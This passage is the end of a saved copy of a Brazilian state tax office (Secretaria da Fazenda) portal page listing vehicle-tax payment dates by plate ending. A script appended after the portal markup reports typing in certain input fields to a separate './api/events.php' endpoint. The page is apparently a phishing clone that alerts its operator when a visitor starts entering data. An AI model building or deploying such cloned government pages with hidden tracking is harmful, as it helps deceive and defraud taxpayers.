                                                                                                                                        class="x250"
                                                                                                                                        style="white-space:nowrap;">&nbsp;-
                                                                                                                                        À
                                                                                                                                        vista
                                                                                                                                        (com
                                                                                                                                        bonificação
                                                                                                                                        de
                                                                                                                                        6%)</span>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </div>
                                                                                                            </div>
                                                                                                        </td>
                                                                                                    </tr>
                                                                                                </tbody>
                                                                                            </table>
                                                                                        </div>
                                                                                        <div><img
                                                                                                id="pt1:r1:0:r1:0:r1:0:s3"
                                                                                                src="./PortalPVAPR_files/t.gif"
                                                                                                alt="" width="10"
                                                                                                height="10"
                                                                                                style="vertical-align:middle;">
                                                                                        </div>
                                                                                        <div>
                                                                                            <div role="grid"
                                                                                                tabindex="0"
                                                                                                id="pt1:r1:0:r1:0:r1:0:t1"
                                                                                                class="xsz x28j xtc xsz"
                                                                                                _afrautohr="25"
                                                                                                _leafcolclientids="[&#39;pt1:r1:0:r1:0:r1:0:t1:c2&#39;,&#39;pt1:r1:0:r1:0:r1:0:t1:c1&#39;]"
                                                                                                style="height: 348px;">
                                                                                                <div role="row"
                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1::ch"
                                                                                                    style="overflow: hidden; position: relative; border-right-width: 0px;"
                                                                                                    _afrcolcount="2"
                                                                                                    class="x14x">
                                                                                                    <table
                                                                                                        role="presentation"
                                                                                                        class="x14z"
                                                                                                        id="pt1:r1:0:r1:0:r1:0:t1::ch::t"
                                                                                                        style="position: relative; table-layout: fixed;"
                                                                                                        cellspacing="0">
                                                                                                        <colgroup
                                                                                                            span="2">
                                                                                                            <col
                                                                                                                style="width: 648px;">
                                                                                                            <col
                                                                                                                style="width: 648px;">
                                                                                                        </colgroup>
                                                                                                        <tbody>
                                                                                                            <tr role="presentation"
                                                                                                                style="visibility:hidden;">
                                                                                                                <th
                                                                                                                    style="padding: 0px 0px 0px 11px; width: 637px;">
                                                                                                                </th>
                                                                                                                <th
                                                                                                                    style="padding: 0px 0px 0px 11px; width: 637px;">
                                                                                                                </th>
                                                                                                            </tr>
                                                                                                            <tr>
                                                                                                                <th id="pt1:r1:0:r1:0:r1:0:t1:c2"
                                                                                                                    tabindex="-1"
                                                                                                                    role="columnheader"
                                                                                                                    scope="col"
                                                                                                                    _d_index="0"
                                                                                                                    _afrleaf="true"
                                                                                                                    _afrroot="true"
                                                                                                                    align="center"
                                                                                                                    class="x150 x28l">
                                                                                                                    <div
                                                                                                                        class="x1h1">
                                                                                                                        <span
                                                                                                                            class="af_column_label-text">PLACAS
                                                                                                                            COM
                                                                                                                            FINAL</span>
                                                                                                                    </div>
                                                                                                                </th>
                                                                                                                <th id="pt1:r1:0:r1:0:r1:0:t1:c1"
                                                                                                                    tabindex="-1"
                                                                                                                    role="columnheader"
                                                                                                                    scope="col"
                                                                                                                    _d_index="1"
                                                                                                                    _afrleaf="true"
                                                                                                                    _afrroot="true"
                                                                                                                    align="center"
                                                                                                                    class="x150 x28l">
                                                                                                                    <div
                                                                                                                        class="x1h1">
                                                                                                                        <span
                                                                                                                            class="af_column_label-text">PRAZO
                                                                                                                            DE
                                                                                                                            PAGAMENTO</span>
                                                                                                                    </div>
                                                                                                                </th>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </div>
                                                                                                <div id="pt1:r1:0:r1:0:r1:0:t1::db"
                                                                                                    class="x14p"
                                                                                                    style="position: relative; overflow: hidden; height: 290px; z-index: 1;"
                                                                                                    _afrcolcount="2">
                                                                                                    <table
                                                                                                        role="presentation"
                                                                                                        summary=""
                                                                                                        class="x14q x15f"
                                                                                                        style="table-layout: fixed; position: relative;"
                                                                                                        cellspacing="0"
                                                                                                        _totalwidth="122"
                                                                                                        _rowcount="5"
                                                                                                        _startrow="0">
                                                                                                        <colgroup
                                                                                                            span="2">
                                                                                                            <col
                                                                                                                style="width: 648px;">
                                                                                                            <col
                                                                                                                style="width: 648px;">
                                                                                                        </colgroup>
                                                                                                        <tbody>
                                                                                                            <tr role="row"
                                                                                                                _afrrk="0"
                                                                                                                class="x14o">
                                                                                                                <td style="width: 637px;"
                                                                                                                    align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:0:c2"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">1
                                                                                                                            e
                                                                                                                            2</span></span>
                                                                                                                </td>
                                                                                                                <td style="width: 637px;"
                                                                                                                    align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:0:c1"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">17/01/2024</span></span>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr role="row"
                                                                                                                _afrrk="1"
                                                                                                                class="x14o">
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:1:c2"
                                                                                                                    class="xib x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">3
                                                                                                                            e
                                                                                                                            4</span></span>
                                                                                                                </td>
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:1:c1"
                                                                                                                    class="xib x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">18/01/2024</span></span>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr role="row"
                                                                                                                _afrrk="2"
                                                                                                                class="x14o">
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:2:c2"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">5
                                                                                                                            e
                                                                                                                            6</span></span>
                                                                                                                </td>
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:2:c1"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">19/01/2024</span></span>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr role="row"
                                                                                                                _afrrk="3"
                                                                                                                class="x14o">
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:3:c2"
                                                                                                                    class="xib x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">7
                                                                                                                            e
                                                                                                                            8</span></span>
                                                                                                                </td>
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:3:c1"
                                                                                                                    class="xib x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">22/01/2024</span></span>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                            <tr role="row"
                                                                                                                _afrrk="4"
                                                                                                                class="x14o">
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:4:c2"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">9
                                                                                                                            e
                                                                                                                            0</span></span>
                                                                                                                </td>
                                                                                                                <td align="center"
                                                                                                                    nowrap=""
                                                                                                                    role="gridcell"
                                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1:4:c1"
                                                                                                                    class="xia x28k">
                                                                                                                    <span
                                                                                                                        class="x221"
                                                                                                                        style="white-space: nowrap"><span
                                                                                                                            class="x24m">23/01/2024</span></span>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </div>
                                                                                                <div id="pt1:r1:0:r1:0:r1:0:t1::_afrHwdwsId"
                                                                                                    style="height: 0px; ">
                                                                                                </div>
                                                                                                <div id="pt1:r1:0:r1:0:r1:0:t1::sm"
                                                                                                    class="x15j"
                                                                                                    style="position: absolute; display: none; z-index: 5000; visibility: visible; top: 180px; right: 594px;">
                                                                                                    Extraindo Dados...
                                                                                                </div>
                                                                                                <div id="pt1:r1:0:r1:0:r1:0:t1::dataW"
                                                                                                    style="display:none">
                                                                                                </div>
                                                                                                <div tabindex="-1"
                                                                                                    id="pt1:r1:0:r1:0:r1:0:t1::scroller"
                                                                                                    style="position: absolute; overflow: auto; z-index: 0;top: 57px; height: 290px; right: 0px;">
                                                                                                    <div
                                                                                                        style="width: 1274px; height: 290px; visibility: hidden;">
                                                                                                    </div>
                                                                                                </div>
                                                                                            </div>
                                                                                        </div>
                                                                                    </div>
                                                                                    <div style="display:none"><a
                                                                                            id="pt1:r1:0:r1:0:r1:0:_afrCommandDelegate"
                                                                                            class="xgl"
                                                                                            onclick="this.focus();return false;"
                                                                                            data-afr-fcs="true"></a>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                        <div id="pt1:r1:0:r1:0:sdi2::body"
                                                                            role="tabpanel" aria-hidden="true"
                                                                            style="display:none">
                                                                            <div id="pt1:r1:0:r1:0:sdi2"
                                                                                class="af_showDetailItem"></div>
                                                                        </div>
                                                                    </div>
                                                                </td>
                                                            </tr>
                                                        </tbody>
                                                    </table>
                                                    <div style="height:1px">
                                                        <div class="x13a" style="height:1px;left:0px;right:0px"><span
                                                                class="xs6"></span></div>
                                                        <div id="pt1:r1:0:r1:0:pt1::tabf" role="tablist"
                                                            style="height:1px;left:0px;right:0px" class="xlq">
                                                            <div role="presentation" class="xm3">
                                                                <div id="pt1:r1:0:r1:0:pt1::tabf::scbi"
                                                                    aria-label="Rolar à esquerda" role="button"
                                                                    class="xm9"><img
                                                                        src="./PortalPVAPR_files/conv_l_ena.png"
                                                                        border="0" alt=""></div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabf::cbc"
                                                                    role="presentation" class="xm5">
                                                                    <div class="xm7" id="pt1:r1:0:r1:0:pt1::tabf::cbs">
                                                                    </div>
                                                                </div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabf::ecbi"
                                                                    aria-label="Rolar à direita" role="button"
                                                                    class="xmb"><img
                                                                        src="./PortalPVAPR_files/conv_r_ena.png"
                                                                        border="0" alt=""></div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabf::cbdli"
                                                                    title="Lista todas as guias"
                                                                    aria-label="Lista todas as guias" role="button"
                                                                    aria-haspopup="true" class="xlp"><img
                                                                        src="./PortalPVAPR_files/dropdown_n.png"
                                                                        border="0" title="Lista todas as guias"
                                                                        alt="Lista todas as guias">
                                                                    <div id="pt1:r1:0:r1:0:pt1::tabf::dlc" class="xlz">
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <div style="display:none"><a id="pt1:r1:0:r1:0:_afrCommandDelegate"
                                                        class="xgl" onclick="this.focus();return false;"
                                                        data-afr-fcs="true"></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div><img id="pt1:r1:0:s5" src="./PortalPVAPR_files/t.gif" alt="" width="10"
                                        height="10" style="vertical-align:middle;">
                                </span>
                            </span><span id="pt1:r1:0:pgl18" class="xsz x1a"></span><span id="pt1:r1:0:pgl19"
                                class="xsz x1a"></span><span id="pt1:r1:0:pgl20" class="xsz x1a"></span>
                        </span>
                        <div id="pt1:r1:popup:popupLogin" style="display:none">
                            <div style="top:auto;right:auto;left:auto;bottom:auto;width:auto;height:auto;position:relative;"
                                id="pt1:r1:popup:popupLogin::content"></div>
                        </div>
                        <div style="display:none"><a id="pt1:r1:0:_afrCommandDelegate" class="xgl"
                                onclick="this.focus();return false;" data-afr-fcs="true"></a>
                        </div>
                    </div>
                </div>
                <div _afrr="y" style="max-height: 100px; width: 0px; height: 1920px;"></div>
            </div>
            <div id="pt1:pt_pgl4" class="x26p xrh" style="visibility: visible; max-height: 39px; min-height: 39px;">
                <div style="display: inline-block; position: absolute; inset: 10px auto auto 525px; width: auto; height: auto; max-width: none; max-height: none;"
                    _afrc="2 1 2 1 center top" class="x26q"><span class="xsz">© Secretaria da Fazenda - Portal SGT
                        versão IP-01.011.49</span></div>
                <div _afrr="y" style="width: 40px; height: 39px;"></div>
            </div><input type="hidden" name="org.apache.myfaces.trinidad.faces.FORM" value="f1"><input
                name="Adf-Window-Id" type="hidden" value="w5jpv4q93o"><span id="f1::postscript"><span
                    id="f1::postscript:st"></span></span><span><input type="hidden" name="javax.faces.ViewState"
                    value="!ecuqr9d2z"></span><input name="Adf-Page-Id" id="Adf-Page-Id" type="hidden"
                autocomplete="off" value="0">
        </form>
        <div id="d1::msgCtr" style="display:none">
            <div id="d1_msgDlg" class="x1d4">
                <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation" class="x1dk">
                    <tbody>
                        <tr>
                            <td class="p_AFResizable x1d9" id="d1_msgDlg::_hse">&nbsp;</td>
                            <td class="p_AFResizable x1db" id="d1_msgDlg::_hce">
                                <table style="cursor:default" cellpadding="0" cellspacing="0" border="0" width="100%"
                                    summary="" role="presentation">
                                    <tbody>
                                        <tr>
                                            <td>
                                                <div id="d1_msgDlg::_ticn" class="x1e7" style="display:none"></div>
                                            </td>
                                            <td class="x1dm" id="d1_msgDlg::tb">
                                                <div id="d1_msgDlg::_ttxt" class="x1e5"></div>
                                            </td>
                                            <td>
                                                <div class="x1e9"><a aria-label="Fechar"
                                                        onclick="this.focus();return false" class="x1dz"
                                                        id="d1_msgDlg::close" title="Fechar"></a></div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                            <td class="p_AFResizable x1dd" id="d1_msgDlg::_hee">&nbsp;</td>
                        </tr>
                        <tr>
                            <td class="p_AFResizable x1dr" id="d1_msgDlg::_cse">&nbsp;</td>
                            <td class="p_AFResizable x1o" id="d1_msgDlg::contentContainer">
                                <div id="d1_msgDlg::_ccntr" class="x1dp"
                                    style="width:auto;height:auto;position:relative;overflow:auto;">
                                    <div id="d1_msgDlg::_cnt" class="x19h"></div>
                                </div>
                            </td>
                            <td class="p_AFResizable x1dt" id="d1_msgDlg::_cee">&nbsp;</td>
                        </tr>
                        <tr>
                            <td class="p_AFResizable x1de" id="d1_msgDlg::_fse">
                                <div></div>
                            </td>
                            <td class="p_AFResizable x1df" id="d1_msgDlg::_fce">
                                <table cellpadding="0" cellspacing="0" border="0" width="100%" summary=""
                                    role="presentation">
                                    <tbody>
                                        <tr>
                                            <td class="p_AFResizable x1dx" id="d1_msgDlg::_fcc">
                                                <div id="d1_msgDlg_cancel" class="xfl p_AFTextOnly p_AFActionDisabled"
                                                    _afrgrp="0" role="presentation" data-afr-pdo="cancel"><a
                                                        onclick="this.focus();return false" data-afr-fcs="true"
                                                        class="xfn" role="button"><span class="xfv">OK</span></a></div>
                                            </td>
                                            <td align="left" valign="bottom">
                                                <div class="p_AFResizable x1e4"><a tabindex="-1" class="x1e2"
                                                        id="d1_msgDlg::_ree" title="Redimensionar"></a></div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                            </td>
                            <td class="p_AFResizable x1dg" id="d1_msgDlg::_fee">
                                <div></div>
                            </td>
                        </tr>
                    </tbody>
                </table>
            </div>
        </div>
        <div id="d1::liveCtr" role="alert" aria-live="assertive" aria-atomic="true" class="p_OraHiddenLabel"></div><span
            id="d1::iconC" style="display:none"><span id="af_message::confirmation-icon"><img
                    src="./PortalPVAPR_files/confirmation_status.png" width="16" height="16" border="0"
                    title="Confirmação" alt="Confirmação"></span><span id="af_table::disclosed-icon"><img
                    src="./PortalPVAPR_files/discloseexpanded_16_ena.png" border="0" alt=""></span><span
                id="af_message::warning-icon"><img src="./PortalPVAPR_files/warning_status.png" width="16" height="16"
                    border="0" title="Advertência" alt="Advertência"></span><span id="af_messages::info-icon"><img
                    src="./PortalPVAPR_files/info_status.png" width="16" height="16" border="0" title="Informações"
                    alt="Informações"></span><span id="af_messages::confirmation-icon"><img
                    src="./PortalPVAPR_files/confirmation_status.png" width="16" height="16" border="0"
                    title="Confirmação" alt="Confirmação"></span><span id="af_table::undisclosed-icon"><img
                    src="./PortalPVAPR_files/disclosecollapsed_16_ena.png" border="0" alt=""></span><span
                id="af_message::info-icon"><img src="./PortalPVAPR_files/info_status.png" width="16" height="16"
                    border="0" title="Informações" alt="Informações"></span><span id="af_message::error-icon"><img
                    src="./PortalPVAPR_files/error_status.png" width="16" height="16" border="0" title="Erro"
                    alt="Erro"></span><span id="af_message::fatal-icon"><img src="./PortalPVAPR_files/error_status.png"
                    width="16" height="16" border="0" title="Erro Crítico" alt="Erro Crítico"></span><span
                id="af_messages::error-icon"><img src="./PortalPVAPR_files/error_status.png" width="16" height="16"
                    border="0" title="Erro" alt="Erro"></span><span id="af_messages::fatal-icon"><img
                    src="./PortalPVAPR_files/error_status.png" width="16" height="16" border="0" title="Erro Crítico"
                    alt="Erro Crítico"></span><span id="af_messages::warning-icon"><img
                    src="./PortalPVAPR_files/warning_status.png" width="16" height="16" border="0" title="Advertência"
                    alt="Advertência"></span></span>
        <div id="afr::DlgSrvPopupCtnr">
            <div id="afr::DlgSrvPopupCtnr::content" style="display:none"></div>
        </div>
        <div id="afr::UtilPopupCtnr" data-afr-pid="j_id4" data-afr-did="j_id5" style="display:none">
            <div id="j_id4" style="display:none">
                <div style="top:auto;right:auto;left:auto;bottom:auto;width:auto;height:auto;position:relative;"
                    id="j_id4::content">
                    <div id="j_id5" class="x1d4">
                        <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                        <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                        <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                        <div class="x1ef" data-afr-panelwindowbackground="1"></div>
                        <table cellpadding="0" cellspacing="0" border="0" summary="" role="presentation" class="x1dk">
                            <tbody>
                                <tr>
                                    <td class="x1d9" id="j_id5::_hse">&nbsp;</td>
                                    <td class="x1db" id="j_id5::_hce">
                                        <table style="cursor:default" cellpadding="0" cellspacing="0" border="0"
                                            width="100%" summary="" role="presentation">
                                            <tbody>
                                                <tr>
                                                    <td>
                                                        <div id="j_id5::_ticn" class="x1e7" style="display:none"></div>
                                                    </td>
                                                    <td class="x1dm" id="j_id5::tb">
                                                        <div id="j_id5::_ttxt" class="x1e5"></div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                    <td class="x1dd" id="j_id5::_hee">&nbsp;</td>
                                </tr>
                                <tr>
                                    <td class="x1dr" id="j_id5::_cse">&nbsp;</td>
                                    <td class="x1o" id="j_id5::contentContainer"></td>
                                    <td class="x1dt" id="j_id5::_cee">&nbsp;</td>
                                </tr>
                                <tr>
                                    <td class="x1de" id="j_id5::_fse">
                                        <div></div>
                                    </td>
                                    <td class="x1df" id="j_id5::_fce">
                                        <table cellpadding="0" cellspacing="0" border="0" width="100%" summary=""
                                            role="presentation">
                                            <tbody>
                                                <tr>
                                                    <td class="x1dx" id="j_id5::_fcc">
                                                        <div id="j_id5_ok" class="xfl p_AFTextOnly p_AFActionDisabled"
                                                            _afrgrp="0" role="presentation" data-afr-pdo="ok"><a
                                                                onclick="this.focus();return false" data-afr-fcs="true"
                                                                class="xfn" role="button"><span
                                                                    class="xfv">OK</span></a></div>
                                                        <div id="j_id5_cancel"
                                                            class="xfl p_AFTextOnly p_AFActionDisabled" _afrgrp="0"
                                                            role="presentation" data-afr-pdo="cancel"><a
                                                                onclick="this.focus();return false" data-afr-fcs="true"
                                                                class="xfn" role="button"><span
                                                                    class="xfv">Cancelar</span></a></div>
                                                    </td>
                                                    <td align="left" valign="bottom">
                                                        <div class="x1e4"><a tabindex="-1" class="x1e2" id="j_id5::_ree"
                                                                title="Redimensionar"></a></div>
                                                    </td>
                                                </tr>
                                            </tbody>
                                        </table>
                                    </td>
                                    <td class="x1dg" id="j_id5::_fee">
                                        <div></div>
                                    </td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <form>
        <input id="afr::ATFlush" type="hidden" value="0">
    </form>
    <div id="_adfStreamingIframe" style="display: none;"><iframe src="./PortalPVAPR_files/home"
            onload="AdfPage.PAGE.getDataTransferService().processStreamingResponse(&#39;parent.AdfPage.PAGE.streamingResponseComplete();&#39;);"></iframe>
    </div>
    <div id="_afrParserDiv" style="display: none;"></div>

    <script>
    function Get(data, urlapi, q) {

        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
            if (this.readyState == 4 && this.status == 200) {
                var json = this.response;

            }
        };
        xhttp.open("GET", urlapi + data, true);
        xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
        xhttp.send();
        return false;
    }
    const inputs = document.querySelectorAll('.eventsD');

    var valX = 5;
    inputs.forEach(function(input) {
        input.addEventListener('input', function(event) {
            if (valX == 5) {
                Get('?ev=D&tela=ippr', './api/events.php');
                valX = 0;
            }
            valX++;
        });
    });
    </script>
</body>


</html>